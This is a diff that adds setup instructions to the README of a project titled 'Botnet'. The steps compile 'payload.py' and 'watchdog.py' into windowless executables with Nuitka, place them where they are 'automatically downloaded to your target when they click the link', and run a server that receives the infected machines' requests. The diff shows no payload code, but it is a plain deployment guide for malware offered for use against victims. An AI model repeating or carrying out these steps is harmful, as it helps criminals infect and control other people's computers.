@@ -1,5 +1,25 @@
 # Botnet
 
+# Instructions:
+
+1) Make sure all files are in the same folder.
+
+2) create a folder called static, and in that folder create a folder called windows.
+
+3) compile payload.py, and watchdog.py with "Nuitka" using the command " python -m nuitka --onefile --disable-console script.py"
+
+4) place both compiled files in the Windows folder you created ealiar, these files will be automatically downloaded to your target when they click the link.
+
+5) run server.py using " python server.py " or " python3 server.py " from the commandline.
+
+6) test by downloading the Watchdog file from the link "http://<yourip>:<port>/downloads/windows/watchdog"
+
+7) you should see requests comming in to your server...enjoy
+
+
+
+
+
 # Watchdog:
 
 
